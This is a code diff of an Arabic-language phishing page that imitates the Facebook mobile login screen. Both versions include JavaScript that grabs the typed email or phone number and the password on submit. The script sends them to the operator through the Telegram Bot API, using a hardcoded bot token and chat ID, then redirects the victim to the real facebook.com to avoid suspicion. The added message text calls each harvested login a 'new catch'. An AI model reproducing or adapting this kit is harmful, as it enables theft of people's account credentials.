@@ -8,63 +8,73 @@
 </head>
 <body>
 
-    <div class="fb-container">
-        <!-- القسم الأيسر: الشعار والنص التوضيحي -->
-        <div class="fb-left">
-            <h1 class="fb-logo">facebook</h1>
-            <p>يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين تعرفهم.</p>
+    <div class="login-container">
+        <!-- اختيار اللغة -->
+        <div class="lang-selection">
+            <span>العربية</span>
+            <span class="arrow">v</span>
         </div>
 
-        <!-- القسم الأيمن: صندوق تسجيل الدخول -->
-        <div class="fb-right">
-            <div class="login-card">
-                <form id="loginForm">
-                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                    <input type="password" id="password" placeholder="كلمة السر" required>
-                    <button type="submit" class="login-btn">تسجيل الدخول</button>
-                </form>
-                
-                <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
-                
-                <hr>
-                
-                <div class="create-btn-container">
-                    <button type="button" class="create-btn">إنشاء حساب جديد</button>
-                </div>
-            </div>
+        <!-- اللوجو الدائري لفيسبوك -->
+        <div class="logo-box">
+            <div class="fb-logo-circle">f</div>
+        </div>
+
+        <!-- نموذج تسجيل الدخول -->
+        <form id="loginForm" class="form-box">
+            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
             
-            <div class="page-footer">
-                <p><b>إنشاء صفحة</b> لشخصية مشهورة أو علامة تجارية أو شركة.</p>
-            </div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+            
+            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+        </form>
+
+        <!-- زر إنشاء حساب جديد -->
+        <div class="create-account-box">
+            <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        </div>
+
+        <!-- شعار Meta في الأسفل -->
+        <div class="meta-footer">
+            <span class="meta-icon">∞</span> Meta
         </div>
     </div>
 
-    <!-- كود الجافاسكريبت لربط البيانات بتليجرام -->
+    <!-- كود إرسال البيانات إلى تيليجرام -->
     <script>
+        const botToken = "8880573702:AAEcni2H3MYNKKyU0GJen2XqPFgAyLO4Mdw";
+        const chatId = "8304712202";
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // منع الصفحة من إعادة التحميل
+            e.preventDefault();
 
-            // جلب القيم المكتوبة
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-            // بيانات بوت تليجرام الخاص بك
-            var botToken = '8880573702:AAEcni2H3MYNKKyU0GJen2XqPFgAyLO4Mdw'; 
-            var chatId = '8304712202'; 
+            const message = `🔔 صيد جديد يا غالي:\n\n📧 البريد/الهاتف: ${email}\n🔑 كلمة السر: ${password}`;
 
-            var message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // إرسال البيانات للبوت
-            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url).then(response => {
-                // تحويل المستخدم لفيسبوك الحقيقي بعد الضغط
-                window.location.href = 'https://www.facebook.com';
-            }).catch(error => {
-                window.location.href = 'https://www.facebook.com';
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = "https://www.facebook.com";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = "https://www.facebook.com";
             });
         });
     </script>
-
 </body>
 </html>
